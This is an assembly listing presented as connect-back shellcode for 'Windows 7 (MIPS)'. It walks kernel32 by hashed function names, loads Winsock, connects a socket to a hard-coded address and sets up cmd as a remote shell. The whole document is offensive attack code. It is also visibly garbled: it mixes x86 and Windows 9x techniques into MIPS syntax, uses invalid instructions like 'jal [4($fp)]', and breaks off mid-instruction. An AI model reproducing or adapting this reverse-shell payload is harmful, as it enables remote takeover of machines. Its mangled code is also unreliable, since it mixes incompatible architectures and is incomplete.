; Connectback shellcode for Windows 7 (MIPS)
.section .text
.global _start

_start:
    ; Jump to the startup bounce point
    j startup_bnc

find_kernel32:
    ; Preserve registers
    addiu $sp, $sp, -8
    sw $ra, 4($sp)
    sw $s0, 0($sp)
    li $v0, 0
    lw $v0, 0x30($v0)
    bgez $v0, find_kernel32_nt
find_kernel32_9x:
    lw $v0, 0x34($v0)
    addiu $v0, $v0, 0x7c
    lw $v0, 0x3c($v0)
    b find_kernel32_finished
find_kernel32_nt:
    lw $v0, 0x0c($v0)
    lw $s0, 0x1c($v0)
    lw $v0, 0($s0)
    lw $v0, 0x8($v0)
find_kernel32_finished:
    lw $ra, 4($sp)
    lw $s0, 0($sp)
    addiu $sp, $sp, 8
    jr $ra

find_function:
    ; Preserve all registers
    addiu $sp, $sp, -56
    sw $ra, 52($sp)
    sw $fp, 48($sp)
    sw $s7, 44($sp)
    sw $s6, 40($sp)
    sw $s5, 36($sp)
    sw $s4, 32($sp)
    sw $s3, 28($sp)
    sw $s2, 24($sp)
    sw $s1, 20($sp)
    sw $s0, 16($sp)
    move $fp, $sp
    lw $s0, 0x24($fp)
    lw $t0, 0x3c($s0)
    lw $t1, 0x78($s0)
    add $t1, $s0
    lw $t2, 0x18($t1)
    lw $t3, 0x20($t1)
    add $t3, $s0
find_function_loop:
    beqz $t2, find_function_finished
    addiu $t2, $t2, -1
    lw $t4, 0($t3)
    add $t4, $s0
    xor $t5, $t5, $t5
    xor $t6, $t6, $t6
compute_hash:
    lbu $t7, 0($t4)
    beqz $t7, compute_hash_finished
    ror $t5, $t5, 13
    addu $t5, $t5, $t7
    addiu $t4, $t4, 1
    b compute_hash
compute_hash_finished:
    lw $t8, 0x28($fp)
    bne $t5, $t8, find_function_loop
    lw $t9, 0x24($t1)
    add $t9, $s0
    lhu $t2, 0($t9)
    lw $t3, 0x1c($t1)
    add $t3, $s0
    lw $v0, 0($t3)
    add $v0, $s0
    sw $v0, 0x1c($fp)
find_function_finished:
    lw $ra, 52($sp)
    lw $fp, 48($sp)
    lw $s7, 44($sp)
    lw $s6, 40($sp)
    lw $s5, 36($sp)
    lw $s4, 32($sp)
    lw $s3, 28($sp)
    lw $s2, 24($sp)
    lw $s1, 20($sp)
    lw $s0, 16($sp)
    addiu $sp, $sp, 56
    jr $ra

startup_bnc:
    j startup

resolve_symbols_for_dll:
    lw $v0, 0($s0)
    addiu $s0, $s0, 4
    sw $v0, 0($s1)
    addiu $s1, $s1, 4
    bne $s0, $s2, resolve_symbols_for_dll
resolve_symbols_for_dll_finished:
    jr $ra

kernel32_symbol_hashes:
    .word 0xec0e4e8e
    .word 0x16b3fe72
    .word 0x73e2d87e

ws2_32_symbol_hashes:
    .word 0xadf509d9
    .word 0x60aaf9ec

startup:
    addiu $sp, $sp, -96
    move $fp, $sp
    j get_absolute_address_forward
get_absolute_address_middle:
    j get_absolute_address_end
get_absolute_address_forward:
    jal get_absolute_address_middle
get_absolute_address_end:
    lw $s0, 0($sp)
    jal find_kernel32
    move $s1, $v0
resolve_kernel32_symbols:
    addiu $s0, $s0, -34
    addiu $s1, $fp, 4
    move $s2, $s0
    addiu $s2, $s2, 12
    jal resolve_symbols_for_dll
resolve_winsock_symbols:
    addiu $s2, $s2, 8
    li $v0, 0x3233
    sw $v0, 0($sp)
    li $v0, 0x5f327377
    sw $v0, 4($sp)
    move $s3, $sp
    sw $s2, 8($sp)
    sw $s1, 12($sp)
    sw $s3, 16($sp)
    jal [4($fp)]
    lw $s1, 12($sp)
    lw $s2, 8($sp)
    move $s1, $v0
    jal resolve_symbols_for_dll
initialize_cmd:
    li $v0, 0x646d6301
    sra $v0, $v0, 8
    sw $v0, 0($sp)
    sw $sp, 48($fp)
create_socket:
    li $v0, 0
    sw $v0, 0($sp)
    sw $v0, 4($sp)
    sw $v0, 8($sp)
    sw $v0, 12($sp)
    li $v0, 1
    sw $v0, 16($sp)
    li $v0, 2
    sw $v0, 20($sp)
    jal [16($fp)]
    move $s0, $v0
do_connect:
    li $v0, 0x0101017f
    sw $v0, 0($sp)
    li $v0, 0x5c110102
    sra $v0, $v0, 8
    sw $v0, 4($sp)
    move $s1, $sp
    li $v0, 16
    sw $v0, 8($sp)
    sw $s1, 12($sp)
    sw $s0, 16($sp)
    jal [20($fp)]
initialize_process:
    li $v0, 0
    li $v1, 84
    subu $sp, $sp, $v1
    move $s1, $sp
    sw $s1, 0($sp)
zero_structs:
    li $v0, 0
    li $v1, 84
    jal memset
initialize_structs:
    li $v0, 68
    sb $v0, 0($s1)
    li $v0, 1
    sb $v0, 45($s1)
    sw $s1, 0($sp)
    move $v0, $s0
    addiu $s1, $s1, 56
    sw $v0, 0($s1)
    sw $v0, 4($s1)
    sw $v0, 8($s1)
    lw $s1, 0($sp)
execute_process:
    li $v0, 0
    addiu $s0, $s1, 68
    sw $s0, 0($sp)
    sw $s1, 4($sp)
    sw $v0, 8($sp)
    sw $v0, 12($sp)
    sw $v0, 16($sp)
    li $v0, 1
    sw $v0, 20($sp)
    li $v0, -1
    sw $v0, 24($sp)
    sw